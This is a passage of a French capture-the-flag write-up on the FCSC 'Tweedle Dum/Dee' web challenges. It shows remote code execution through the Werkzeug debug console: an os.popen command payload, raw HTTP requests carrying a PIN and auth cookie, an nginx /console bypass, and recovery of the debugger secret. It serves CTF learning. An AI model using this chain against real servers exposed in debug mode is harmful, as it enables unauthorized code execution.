+</span></span></code></pre></div><p>On peut donc le rentrer sur le <em>/console</em> et accéder à la console python. On flag finalement grâce au module <strong>os</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;cat flag*&#39;</span>)<span style="color:#f92672">.</span>read();
+</span></span></code></pre></div><p><img src="./img/4.png" alt="Alt text"></p>
+<p><img src="./img/meme1.jpg" alt="Alt text"></p>
+<h1 id="tweedle-dee">Tweedle Dee</h1>
+<p>Ce challenge est une version plus complexe du précédent. Encore une fois, le code source est fourni et voici les modifications:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
+</span></span><span style="display:flex;"><span>├── docker-compose.yml
+</span></span><span style="display:flex;"><span>└── src
+</span></span><span style="display:flex;"><span>    ├── app
+</span></span><span style="display:flex;"><span>    │ ├── app.py
+</span></span><span style="display:flex;"><span>    │ ├── Dockerfile
+</span></span><span style="display:flex;"><span>    │ ├── static
+</span></span><span style="display:flex;"><span>    │ │ ├── style.css
+</span></span><span style="display:flex;"><span>    │ │ └── tweedle.png
+</span></span><span style="display:flex;"><span>    │ └── templates
+</span></span><span style="display:flex;"><span>    │     └── index.html
+</span></span><span style="display:flex;"><span>    └── nginx
+</span></span><span style="display:flex;"><span>        ├── Dockerfile
+</span></span><span style="display:flex;"><span>        └── nginx.conf
+</span></span></code></pre></div><p>Un nginx est configuré pour effectuer des restrictions sur certains end-points !</p>
+<p>Voila le contenu de la configuration nginx présente dans <em>nginx.conf</em> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>worker_processes 4;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>events <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    use epoll;
+</span></span><span style="display:flex;"><span>    worker_connections 128;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    charset utf-8;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    access_log /dev/stdout combined;
+</span></span><span style="display:flex;"><span>    error_log /dev/stdout debug;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    real_ip_header X-Forwarded-For;
+</span></span><span style="display:flex;"><span>    real_ip_recursive on;
+</span></span><span style="display:flex;"><span>    set_real_ip_from 0.0.0.0/0;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        listen 2201;
+</span></span><span style="display:flex;"><span>        server_name _;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location /console <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">403</span> <span style="color:#e6db74">&#34;Bye&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location @error <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">500</span> <span style="color:#e6db74">&#34;Bye&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        location / <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>            error_page <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">503</span> @error;
+</span></span><span style="display:flex;"><span>            proxy_intercept_errors on;
+</span></span><span style="display:flex;"><span>            proxy_pass http://app:5000;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Les parties intéressantes sont ces deux lignes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>location /console <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">403</span> <span style="color:#e6db74">&#34;Bye&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>location @error <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">500</span> <span style="color:#e6db74">&#34;Bye&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Le end-point de debug <code>/console</code> n&rsquo;est plus accessible et la stackstrace d&rsquo;erreur non plus. L&rsquo;objectif quant à lui reste le même: <em>RCE via le mode debug activé</em></p>
+<h2 id="partie-1-bypass-de-console-et-premières-réflexions">Partie 1: Bypass de /console et premières réflexions.</h2>
+<p>La première chose que j&rsquo;ai faite et de ré-utiliser le challenge précédent pour voir quelles requêtes étaient envoyés depuis mon navigateur. Deux en sont ressorties :</p>
+<ul>
+<li>
+<p><strong>L&rsquo;envoi du code pin au moment de l&rsquo;authentification</strong> :</p>
+<pre tabindex="0"><code>GET /console?__debugger__=yes&amp;cmd=pinauth&amp;pin=415-333-840&amp;s=Reqj7S50iZAVj97HzbW4 HTTP/1.1
+Host: tweedle-dum.france-cybersecurity-challenge.fr
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Sec-Ch-Ua-Platform: &#34;Windows&#34;
+Accept: */*
+Referer: https://tweedle-dum.france-cybersecurity-challenge.fr/console
+Connection: close
+</code></pre></li>
+<li>
+<p><strong>L&rsquo;envoi d&rsquo;une commande via la console après authentification</strong> :</p>
+<pre tabindex="0"><code>GET /console?&amp;__debugger__=yes&amp;cmd=__import__(%27os%27).popen(%27cat%20flag*%27).read()%3B&amp;frm=0&amp;s=Reqj7S50iZAVj97HzbW4 HTTP/1.1
+Host: tweedle-dum.france-cybersecurity-challenge.fr
+Cookie: __wzdf352e7b3f2a1e68a6bbc=1682640498|145ff1701ade
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
+Sec-Ch-Ua-Platform: &#34;Windows&#34;
+Accept: */*
+Referer: https://tweedle-dum.france-cybersecurity-challenge.fr/console
+Connection: close
+</code></pre></li>
+</ul>
+<p>Il semblerai que la première étape soit de s&rsquo;authentifier puis de passer une commande dans le paramètre <strong>cmd</strong>.</p>
+<h3 id="problèmes-">Problèmes :</h3>
+<h4 id="1-console-interdit-">1) /console interdit !</h4>
+<p>Il faut se rendre dans le code source de la partie debug de werkzeug pour comprendre : <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L500" target="_blank">ici</a></p>
+<p>On voit que ce qui trigger le code qui mène à la RCE est <code>__call__</code>.<br>
+Cela veut dire que n&rsquo;importe quel end-point fonctionnerai de la même manière que <em>/console</em> !</p>
+<p>Si on test avec le challenge précédent :<br>
+<img src="./img/5.png" alt="Alt text"></p>
+<p>Bingo, On a trouvé un moyen de bypass le nginx !
+Les paramètres à passer sont:</p>
+<ul>
+<li><code>__debugger__</code> = yes</li>
+<li><code>cmd</code> = &hellip;</li>
+<li><code>frm</code> = &hellip;</li>
+<li><code>s</code> = &hellip;</li>
+</ul>
+<p>Sans oublier un header qui contient un cookie d&rsquo;authentification (récupéré après l&rsquo;authentification par code pin et secret):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Cookie: __wzdf352e7b3f2a1e68a6bbc<span style="color:#f92672">=</span>1682640498|145ff1701ade
+</span></span></code></pre></div><p>Voici le code correspondant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;__debugger__&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;yes&#34;</span>:
+</span></span><span style="display:flex;"><span>    cmd <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;cmd&#34;</span>)
+</span></span><span style="display:flex;"><span>    arg <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;f&#34;</span>)
+</span></span><span style="display:flex;"><span>    secret <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;s&#34;</span>)
+</span></span><span style="display:flex;"><span>    frame <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>frames<span style="color:#f92672">.</span>get(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;frm&#34;</span>, type<span style="color:#f92672">=</span>int))  <span style="color:#75715e"># type: ignore</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> cmd <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;resource&#34;</span> <span style="color:#f92672">and</span> arg:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>get_resource(request, arg)  <span style="color:#75715e"># type: ignore</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cmd <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;pinauth&#34;</span> <span style="color:#f92672">and</span> secret <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>secret:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>pin_auth(request)  <span style="color:#75715e"># type: ignore</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> cmd <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;printpin&#34;</span> <span style="color:#f92672">and</span> secret <span style="color:#f92672">==</span> self<span style="color:#f92672">.</span>secret:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>log_pin_request()  <span style="color:#75715e"># type: ignore</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> (
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>evalex
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">and</span> cmd <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">and</span> frame <span style="color:#f92672">is</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>secret <span style="color:#f92672">==</span> secret
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>check_pin_trust(environ)
+</span></span><span style="display:flex;"><span>    ):
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>execute_command(request, cmd, frame)
+</span></span></code></pre></div><p>À ce stade, il nous manque :</p>
+<ul>
+<li>Le nom cookie d&rsquo;authentification</li>
+<li>La valeur du cookie d&rsquo;authentification</li>
+<li>le secret <em>s</em></li>
+<li>la frame <em>f</em></li>
+</ul>
+<p>En suivant la création du cookie d&rsquo;authentification, on tombe sur ces deux codes: <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L479" target="_blank">1</a> et <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L41" target="_blank">2</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> auth:
+</span></span><span style="display:flex;"><span>    rv<span style="color:#f92672">.</span>set_cookie(
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>pin_cookie_name,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>int(time<span style="color:#f92672">.</span>time())<span style="color:#e6db74">}</span><span style="color:#e6db74">|</span><span style="color:#e6db74">{</span>hash_pin(pin)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>        httponly<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,
+</span></span><span style="display:flex;"><span>        samesite<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Strict&#34;</span>,
+</span></span><span style="display:flex;"><span>        secure<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>is_secure,
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hash_pin</span>(pin: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hashlib<span style="color:#f92672">.</span>sha1(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>pin<span style="color:#e6db74">}</span><span style="color:#e6db74"> added salt&#34;</span><span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf-8&#34;</span>, <span style="color:#e6db74">&#34;replace&#34;</span>))<span style="color:#f92672">.</span>hexdigest()[:<span style="color:#ae81ff">12</span>]
+</span></span></code></pre></div><p>Le cookie est calculable à partir du <code>pin</code> de l&rsquo;application. Celui étant récupérable de la même manière que le challenge précédent, il ne nous pose plus de souci !</p>
+<h4 id="2-récupérations-des-autres-variables">2) Récupérations des autres variables.</h4>
+<p>Notre méthode pour récupérer une variable n&rsquo;est fonctionnelle que sur des variables présentent dans des objets python atteignables. Si on regarde la définition de <code>secret</code>: <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py#L285" target="_blank">1</a> et <a href="https://github.com/pallets/werkzeug/blob/main/src/werkzeug/security.py#LL18C1-L23C70" target="_blank">2</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">DebuggedApplication</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> __init__(<span style="color:#f92672">...</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>secret <span style="color:#f92672">=</span> gen_salt(<span style="color:#ae81ff">20</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>et
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">gen_salt</span>(length: int) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;Generate a random string of SALT_CHARS with specified ``length``.&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> length <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">&#34;Salt length must be at least 1.&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(secrets<span style="color:#f92672">.</span>choice(SALT_CHARS) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(length))
+</span></span></code></pre></div><p>On se rend compte que:</p>
+<ul>
+<li>le secret est généré de manière sécurisée aléatoirement</li>
+<li><strong>secret</strong> est un attribut d&rsquo;un objet instancié par la classe <code>DebuggedApplication</code> et nous n&rsquo;avons pas d&rsquo;accès direct à cet objet.</li>
+</ul>
+<p>On peut suivre la création de ce dit objet <em>DebuggedApplication</em> dans la fonction <strong>run_simple</strong> <a href="https://github.com/pallets/werkzeug/blob/ad05a241ff2e2f113c8579dd792eb4101900812c/src/werkzeug/serving.py#L1068" target="_blank">ici</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> use_debugger:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> .debug <span style="color:#f92672">import</span> DebuggedApplication
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    application <span style="color:#f92672">=</span> DebuggedApplication(application, evalex<span style="color:#f92672">=</span>use_evalex)
+</span></span></code></pre></div><p>À partir de ce moment là, j&rsquo;ai tenté de récupérer cet objet <code>run_simple</code> afin de remonter jusqu&rsquo;à <code>application</code> puis <code>secret</code> sans succès &hellip;</p>
+<h6 id="solution">Solution:</h6>
+<p>Grâce à la format string j&rsquo;ai énuméré tous les modules chargés en mémoire:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{ua<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[t]<span style="color:#f92672">.</span>sys<span style="color:#f92672">.</span>modules}
+</span></span></code></pre></div><p><em>Résultats</em> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;sys&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;sys&#39;</span> (built<span style="color:#f92672">-</span><span style="color:#f92672">in</span>)<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;builtins&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;builtins&#39;</span> (built<span style="color:#f92672">-</span><span style="color:#f92672">in</span>)<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;_frozen_importlib&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;_frozen_importlib&#39;</span> (frozen)<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;_imp&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;_imp&#39;</span> (built<span style="color:#f92672">-</span><span style="color:#f92672">in</span>)<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;_thread&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;_thread&#39;</span> (built<span style="color:#f92672">-</span><span style="color:#f92672">in</span>)<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;_warnings&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;_warnings&#39;</span> (built<span style="color:#f92672">-</span><span style="color:#f92672">in</span>)<span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;threading&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;threading&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;/usr/local/lib/python3.10/threading.py&#39;</span><span style="color:#f92672">&gt;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span></code></pre></div><p>threading, threading ? THREADING ? &hellip; EUREKA !</p>
+<p>Il est obligatoire que l&rsquo;application flask fonctionne sur un <em>thread</em> qui loop infiniment.
+<a href="https://github.com/pallets/werkzeug/blob/ad05a241ff2e2f113c8579dd792eb4101900812c/src/werkzeug/serving.py#L1107" target="_blank">Dans le fichier serving.py de werkeug</a> on lit dans la fonction <strong>run_simple</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>srv<span style="color:#f92672">.</span>serve_forever()
+</span></span></code></pre></div><p>On va ici essayer de retrouver le thread faisant tourné le serveur. Celui ci étant la racine de l&rsquo;application Flask, il contiendra l&rsquo;object python &ldquo;WSGIApplication&rdquo; contenant toutes les propriétées recherchées.</p>
+<p>On peut tester en local pour trouver le chemin valide:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> werkzeug.debug <span style="color:#f92672">import</span> DebuggedApplication
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pdb<span style="color:#f92672">,</span>sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">search</span>():
+</span></span><span style="display:flex;"><span>     breakpoint()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;hello&#39;</span>: <span style="color:#e6db74">&#39;world world&#39;</span>}
+</span></span></code></pre></div><p><em>Dans la console</em>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>c<span style="color:#f92672">/</span>Users<span style="color:#f92672">/</span>vozec<span style="color:#f92672">/</span>Desktop<span style="color:#f92672">/</span>explore]<span style="color:#960050;background-color:#1e0010">$</span> flask run <span style="color:#f92672">--</span>host<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0.0.0</span> <span style="color:#f92672">--</span>port<span style="color:#f92672">=</span><span style="color:#ae81ff">2202</span> <span style="color:#f92672">--</span>debug
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Debug mode: on
+</span></span><span style="display:flex;"><span>WARNING: This <span style="color:#f92672">is</span> a development server<span style="color:#f92672">.</span> Do <span style="color:#f92672">not</span> use it <span style="color:#f92672">in</span> a production deployment<span style="color:#f92672">.</span> Use a production WSGI server instead<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Running on all addresses (<span style="color:#ae81ff">0.0.0.0</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Running on http:<span style="color:#f92672">//</span><span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">2202</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Running on http:<span style="color:#f92672">//</span><span style="color:#ae81ff">172.20.86.75</span>:<span style="color:#ae81ff">2202</span>
+</span></span><span style="display:flex;"><span>Press CTRL<span style="color:#f92672">+</span>C to quit
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Restarting <span style="color:#66d9ef">with</span> stat
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Debugger <span style="color:#f92672">is</span> active<span style="color:#960050;background-color:#1e0010">!</span>
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span> Debugger PIN: <span style="color:#ae81ff">133</span><span style="color:#f92672">-</span><span style="color:#ae81ff">978</span><span style="color:#f92672">-</span><span style="color:#ae81ff">663</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>mnt<span style="color:#f92672">/</span>c<span style="color:#f92672">/</span>Users<span style="color:#f92672">/</span>vozec<span style="color:#f92672">/</span>Desktop<span style="color:#f92672">/</span>explore<span style="color:#f92672">/</span>app<span style="color:#f92672">.</span>py(<span style="color:#ae81ff">10</span>)search()
+</span></span><span style="display:flex;"><span><span style="color:#f92672">-&gt;</span> <span style="color:#66d9ef">return</span> {<span style="color:#e6db74">&#39;hello&#39;</span>: <span style="color:#e6db74">&#39;world world&#39;</span>}
+</span></span><span style="display:flex;"><span>(Pdb) dir(sys<span style="color:#f92672">.</span>modules[<span style="color:#e6db74">&#39;threading&#39;</span>])
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#39;Barrier&#39;</span>, <span style="color:#e6db74">&#39;BoundedSemaphore&#39;</span>, <span style="color:#e6db74">&#39;BrokenBarrierError&#39;</span>, <span style="color:#e6db74">&#39;Condition&#39;</span>, <span style="color:#e6db74">&#39;Event&#39;</span>, <span style="color:#e6db74">&#39;ExceptHookArgs&#39;</span>, <span style="color:#e6db74">&#39;Lock&#39;</span>, <span style="color:#e6db74">&#39;RLock&#39;</span>, <span style="color:#e6db74">&#39;Semaphore&#39;</span>, <span style="color:#e6db74">&#39;TIMEOUT_MAX&#39;</span>, <span style="color:#e6db74">&#39;Thread&#39;</span>, <span style="color:#e6db74">&#39;ThreadError&#39;</span>, <span style="color:#e6db74">&#39;Timer&#39;</span>, <span style="color:#e6db74">&#39;WeakSet&#39;</span>, <span style="color:#e6db74">&#39;_CRLock&#39;</span>, <span style="color:#e6db74">&#39;_DummyThread&#39;</span>, <span style="color:#e6db74">&#39;_HAVE_THREAD_NATIVE_ID&#39;</span>, <span style="color:#e6db74">&#39;_MainThread&#39;</span>, <span style="color:#e6db74">&#39;_PyRLock&#39;</span>, <span style="color:#e6db74">&#39;_RLock&#39;</span>, <span style="color:#e6db74">&#39;_SHUTTING_DOWN&#39;</span>, <span style="color:#e6db74">&#39;__all__&#39;</span>, <span style="color:#e6db74">&#39;__builtins__&#39;</span>, <span style="color:#e6db74">&#39;__cached__&#39;</span>, <span style="color:#e6db74">&#39;__doc__&#39;</span>, <span style="color:#e6db74">&#39;__excepthook__&#39;</span>, <span style="color:#e6db74">&#39;__file__&#39;</span>, <span style="color:#e6db74">&#39;__loader__&#39;</span>, <span style="color:#e6db74">&#39;__name__&#39;</span>, <span style="color:#e6db74">&#39;__package__&#39;</span>, <span style="color:#e6db74">&#39;__spec__&#39;</span>, <span style="color:#e6db74">&#39;_active&#39;</span>, <span style="color:#e6db74">&#39;_active_limbo_lock&#39;</span>, <span style="color:#e6db74">&#39;_after_fork&#39;</span>, <span style="color:#e6db74">&#39;_allocate_lock&#39;</span>, <span style="color:#e6db74">&#39;_count&#39;</span>, <span style="color:#e6db74">&#39;_counter&#39;</span>, <span style="color:#e6db74">&#39;_dangling&#39;</span>, <span style="color:#e6db74">&#39;_deque&#39;</span>, <span style="color:#e6db74">&#39;_enumerate&#39;</span>, <span style="color:#e6db74">&#39;_islice&#39;</span>, <span style="color:#e6db74">&#39;_limbo&#39;</span>, <span style="color:#e6db74">&#39;_main_thread&#39;</span>, <span style="color:#e6db74">&#39;_maintain_shutdown_locks&#39;</span>, <span style="color:#e6db74">&#39;_make_invoke_excepthook&#39;</span>, <span style="color:#e6db74">&#39;_newname&#39;</span>, <span style="color:#e6db74">&#39;_os&#39;</span>, <span style="color:#e6db74">&#39;_profile_hook&#39;</span>, <span style="color:#e6db74">&#39;_register_atexit&#39;</span>, <span style="color:#e6db74">&#39;_set_sentinel&#39;</span>, <span style="color:#e6db74">&#39;_shutdown&#39;</span>, <span style="color:#e6db74">&#39;_shutdown_locks&#39;</span>, <span style="color:#e6db74">&#39;_shutdown_locks_lock&#39;</span>, <span style="color:#e6db74">&#39;_start_new_thread&#39;</span>, <span style="color:#e6db74">&#39;_sys&#39;</span>, <span style="color:#e6db74">&#39;_threading_atexits&#39;</span>, <span style="color:#e6db74">&#39;_time&#39;</span>, <span style="color:#e6db74">&#39;_trace_hook&#39;</span>, <span style="color:#e6db74">&#39;activeCount&#39;</span>, <span style="color:#e6db74">&#39;active_count&#39;</span>, <span style="color:#e6db74">&#39;currentThread&#39;</span>, <span 